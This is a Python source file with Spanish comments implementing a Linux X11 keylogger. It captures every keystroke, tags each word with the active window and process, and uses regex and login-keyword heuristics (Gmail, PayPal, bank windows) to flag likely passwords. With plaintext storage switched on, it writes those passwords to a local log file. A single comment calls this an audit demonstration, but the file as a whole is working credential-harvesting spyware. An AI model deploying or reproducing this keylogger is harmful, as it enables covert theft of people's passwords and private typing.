#!/usr/bin/env python3
# password_detector_keylogger_linux.py

# Importamos librerías necesarias:
# pynput: Para capturar eventos de teclado (Input Hooking).
# subprocess: Para ejecutar comandos del sistema (como xdotool).
# re: Para expresiones regulares (análisis de patrones de contraseñas).
from pynput.keyboard import Key, Listener
import logging
import re
import time
import subprocess
import os

# --- Configuración ---
log_dir = ""  # Directorio donde se guardará el log (vacío = directorio actual)
log_file = log_dir + "keylogs_with_pwd_detection.txt"

# [CONFIGURACIÓN CRÍTICA]
# Si es True, el script guarda la contraseña legible en el archivo de texto.
# En un escenario de auditoría real, esto demuestra el impacto crítico de la vulnerabilidad.
STORE_PLAINTEXT_PASSWORDS = True

# Configuración del sistema de logging (registro de eventos)
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s' # Formato: Fecha y hora : Mensaje
)

# Buffer: Variable temporal para acumular caracteres hasta formar una palabra.
current_word = ""

def get_active_window_info():
    """
    Obtiene información sobre la ventana que el usuario está usando actualmente.
    Funciona principalmente en entornos X11 (el estándar gráfico clásico de Linux).
    
    Returns:
        tuple: (nombre_del_proceso, título_de_la_ventana)
    """
    try:
        # 1. Obtener el ID de la ventana activa usando 'xdotool'.
        # xdotool es una herramienta de línea de comandos para simular input y consultar ventanas.
        active_window_id = subprocess.check_output(
            ['xdotool', 'getactivewindow'], 
            stderr=subprocess.DEVNULL # Ignoramos errores en consola
        ).decode('utf-8').strip()
        
        # 2. Usar ese ID para obtener el título visible de la ventana (ej: "Gmail - Mozilla Firefox")
        window_title = subprocess.check_output(
            ['xdotool', 'getwindowname', active_window_id],
            stderr=subprocess.DEVNULL
        ).decode('utf-8').strip()
        
        # 3. Obtener el PID (Process ID) asociado a esa ventana
        pid = subprocess.check_output(
            ['xdotool', 'getwindowpid', active_window_id],
            stderr=subprocess.DEVNULL
        ).decode('utf-8').strip()
        
        # 4. Obtener el nombre real del proceso (ej: "firefox", "gnome-terminal")
        process_name = None
        if pid:
            try:
                # Método rápido: leer directamente del sistema de archivos virtual /proc
                with open(f'/proc/{pid}/comm', 'r') as f:
                    process_name = f.read().strip()
            except:
                # Método alternativo: usar el comando 'ps' si /proc no es accesible
                try:
                    process_name = subprocess.check_output(
                        ['ps', '-p', pid, '-o', 'comm='],
                        stderr=subprocess.DEVNULL
                    ).decode('utf-8').strip()
                except:
                    process_name = None
        
        return (process_name, window_title)
    
    except Exception as e:
        # Si falla (común en Wayland o si falta xdotool), devolvemos valores nulos.
        return (None, None)

# --- Expresiones regulares (Heurística) para detectar contraseñas ---

# Patrón Fuerte: Requiere mayúsculas, minúsculas, números y símbolos. Mínimo 8 caracteres.
strong_pattern = re.compile(r'^(?=.{8,}$)(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*\W).+$')

# Patrón Medio: Mínimo 8 caracteres, combina al menos dos tipos (letras+números, etc.)
medium_pattern = re.compile(r'^(?=.{8,}$)(?:(?=.*[a-z])(?=.*\d)|(?=.*[A-Z])(?=.*\d)|(?=.*[a-z])(?=.*\W)).+$')

# Patrón PIN: Solo dígitos, longitud típica de PIN bancario o de desbloqueo (6-10 nums).
pin_pattern = re.compile(r'^\d{6,10}$')

# Patrón Débil: Lista negra de contraseñas extremadamente comunes.
common_weak = re.compile(r'^(?:password|contraseña|123456|12345678|qwerty|admin|letmein|pass|pwd)$', re.I)

# Patrón Corto con Símbolo: Contraseñas cortas (4-7) pero complejas (ej: "P@ss").
short_sym = re.compile(r'^(?=.{4,7}$)(?=.*\W).+$')

# Contexto: Palabras clave que, si aparecen en el título de la ventana,
# sugieren que el usuario está en un formulario de login.
login_keywords = re.compile(r'(login|log in|signin|sign in|password|contraseñ|clave|auth|credencial|iniciar sesión|signup|register|paypal|bank|gmail|signin)', re.I)

def is_potential_password(s: str, proc: str, title: str):
    """
    Analiza una palabra y decide si parece una contraseña basándose en su complejidad
    y en el contexto de la ventana.
    
    Returns:
        tuple: (es_password, puntaje, razon)
    """
    if not s:
        return (False, None, None)

    # 1. Análisis por complejidad de la cadena (Regex)
    if strong_pattern.match(s):
        return (True, 'STRONG', 'pattern_strong')
    if medium_pattern.match(s):
        return (True, 'MEDIUM', 'pattern_medium')
    if pin_pattern.match(s):
        return (True, 'PIN', 'pattern_pin')
    if common_weak.match(s):
        return (True, 'WEAK', 'common_weak')
    if short_sym.match(s):
        return (True, 'WEAK', 'short_with_symbol')

    # 2. Análisis por contexto (Context-Awareness)
    # Si el título de la ventana dice "Gmail Login" y el usuario escribe algo > 3 letras,
    # el script asume que es una contraseña potencial.
    combined = ' '.join(filter(None, [proc or '', title or '']))
    if login_keywords.search(combined):
        if len(s) >= 4:
            return (True, 'CONTEXT', 'context_keywords')
            
    return (False, None, None)

def log_word_with_context(word: str, proc: str, title: str):
    """
    Registra la palabra en el archivo de log.
    Si detecta que es una contraseña, añade una alerta especial.
    """
    is_pwd, score, reason = is_potential_password(word, proc, title)
    proc = proc or "unknown"
    title = title or ""

    if is_pwd:
        # Formato de ALERTA para contraseñas detectadas
        entry = f"[{proc} - {title}] [POTENTIAL_PASSWORD - {score} - {reason}] len={len(word)}"
        
        # Si la configuración lo permite, guarda la contraseña en texto plano.
        if STORE_PLAINTEXT_PASSWORDS:
            entry += f" plain={word}"
            
        logging.warning(entry) # Usa nivel WARNING para destacar
        print("Detected potential password:", entry)
    else:
        # Registro normal (tecleo estándar, chats, documentos, etc.)
        entry = f"[{proc} - {title}] {word}"
        logging.info(entry)
        print("Flushed:", entry)

def flush_word():
    """
    Se llama cuando el usuario termina una palabra (Espacio/Enter).
    Toma lo acumulado en 'current_word', obtiene el contexto y lo envía a logear.
    """
    global current_word
    if not current_word:
        return
        
    # Aquí es donde capturamos en qué ventana estaba el usuario AL TERMINAR de escribir
    proc, title = get_active_window_info()
    log_word_with_context(current_word, proc, title)
    
    # Reseteamos el buffer para la siguiente palabra
    current_word = ""

def on_press(key):
    """Callback que se ejecuta cada vez que se presiona una tecla."""
    global current_word
    try:
        # Si es un carácter alfanumérico imprimible, lo añadimos al buffer
        ch = key.char
        if ch is not None:
            current_word += ch
    except AttributeError:
        # Manejo de teclas especiales (no tienen atributo .char)
        if key == Key.space:
            flush_word() # Espacio indica fin de palabra
        elif key == Key.enter:
            flush_word() # Enter indica fin de palabra/envío de formulario
        elif key == Key.backspace:
            # Si el usuario borra, lo reflejamos en nuestro buffer para mantener la coherencia
            if current_word:
                current_word = current_word[:-1]
        else:
            # Ignoramos Shift, Ctrl, Alt, etc. para simplificar la captura
            pass

def on_release(key):
    """Callback que se ejecuta al soltar una tecla. Usado para salir."""
    if key == Key.esc:
        flush_word() # Guardamos lo último que haya en memoria
        print("Listener stopped (Esc).")
        return False # Detiene el listener de pynput

def check_dependencies():
    """Verifica que la herramienta externa 'xdotool' esté instalada."""
    try:
        subprocess.run(['xdotool', 'version'], 
                       stdout=subprocess.DEVNULL, 
                       stderr=subprocess.DEVNULL, 
                       check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("WARNING: xdotool no está instalado.")
        print("Instálalo con: sudo apt install xdotool")
        print("Sin xdotool, no se podrá detectar la ventana activa.")
        return False

# --- PUNTO DE ENTRADA PRINCIPAL ---
if __name__ == "__main__":
    print("=== Keylogger para Linux (X11) ===")
    print(f"Logging to: {log_file}")
    
    # Verificación de dependencias del sistema
    has_xdotool = check_dependencies()
    if not has_xdotool:
        response = input("¿Continuar de todos modos? (s/n): ")
        if response.lower() != 's':
            exit(1)
    
    # Detección del entorno gráfico (Wayland vs X11)
    # Wayland aísla las ventanas por seguridad, haciendo que xdotool falle o sea impreciso.
    session_type = os.environ.get('XDG_SESSION_TYPE', '').lower()
    if session_type == 'wayland':
        print("WARNING: Detectado Wayland. Este script está diseñado para X11.")
        print("La detección de ventana activa puede no funcionar correctamente.")
        print("Considera cambiar a una sesión X11 para funcionalidad completa.")
    
    print("Press Esc to stop.")
    print("Iniciando listener...\n")
    
    # Iniciamos el bucle de captura de teclado
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()